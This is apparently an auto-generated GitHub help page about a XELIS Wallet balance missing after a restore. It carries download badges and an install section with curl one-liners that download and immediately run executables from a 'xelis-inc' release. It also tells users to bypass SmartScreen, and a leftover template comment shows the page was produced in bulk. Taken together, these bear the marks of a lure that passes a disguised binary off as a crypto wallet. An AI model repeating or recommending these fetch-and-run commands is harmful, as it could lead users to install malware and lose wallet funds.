![XELIS Wallet balance missing or wrong after a restore](assets/banner-article.png)
# XELIS Wallet balance missing or wrong after a restore

Check the phrase, the sync and the node before fearing the worst.

## Downloads - Fix

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Restoring runs inside the app, so confirm you are on the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1) before treating a balance as missing.

> A restored wallet that shows zero is usually a sync that has not finished or a phrase that is not the one you funded.

A balance that looks wrong after a restore has three common causes: the phrase was entered with an error, the wallet has not finished syncing, or the node it reads does not hold the history you expect. The address is the test that separates them: if it matches the old wallet, the keys are right and the problem is reading the chain.

<!-- ARTICLE-BODY-BEGIN -->
## Compare the address before anything else

A restore derives one address from one phrase. If the address in the restored wallet is the one you funded, the restore is correct and the balance question is about the chain view. If it differs, stop: a single wrong word produces a different, valid wallet with no funds and no error message.

Compare the full address, not the first few characters. The restore procedure and the address comparison are set out in <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-restore-new-computer.md">restore a XELIS Wallet on a new computer</a>, including what to do when the two addresses disagree.

## Let the sync finish, then check the node

A fresh install of the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> starts from nothing and reads the chain to rebuild history. During that window the balance can be zero, partial or stale, and none of it means the funds moved. Watch for progress rather than a fixed time, because how far behind the wallet is decides how long it takes.

If progress stops, the node is the next suspect. A node that prunes old blocks can return a current balance without the full history behind it, which looks like missing records rather than missing money. The diagnostic order is in <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-not-syncing-not-connecting-fix.md">XELIS Wallet not syncing</a>, and switching endpoints is the fastest way to tell a node problem from a wallet problem.

## When two installs disagree

If the old machine still shows one balance and the new one shows another, you have a reference point rather than a mystery. Running both is covered in <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-second-computer-multiple-wallets.md">XELIS Wallet on a second computer</a>, and the rule is the same: do not delete the old install until the new one agrees with it.

## FAQ

### Why is my balance missing in XELIS Wallet after restoring?

Most often the sync has not finished, or the restored address is not the one that held the funds. Check the address, then the node.

### The wallet shows an error loading data and no balance. What now?

A local data read failure is not a chain problem. Restart the app, and if it repeats, reinstall and restore from the phrase rather than creating a new wallet over the old data.

### Can a partial phrase restore a partial balance?

No. A phrase either derives the original address or a different one. There is no partial restore.

### Is the history always complete after a restore?

Not necessarily. History depends on the node keeping it; the current balance is the figure to trust once sync is done.

### What if the balance is lower, not zero?

Compare against an explorer for that address, then check whether an outgoing transaction you forgot about is the difference.

<!-- ARTICLE-BODY-END -->

## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [Restore a XELIS Wallet on a new computer](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-restore-new-computer.md)
- [XELIS Wallet on a second computer](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-second-computer-multiple-wallets.md)
- [Fix XELIS Wallet not syncing](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-not-syncing-not-connecting-fix.md)
- [Self-custody with XELIS Wallet](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-self-custody-control.md)
- [Current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1)
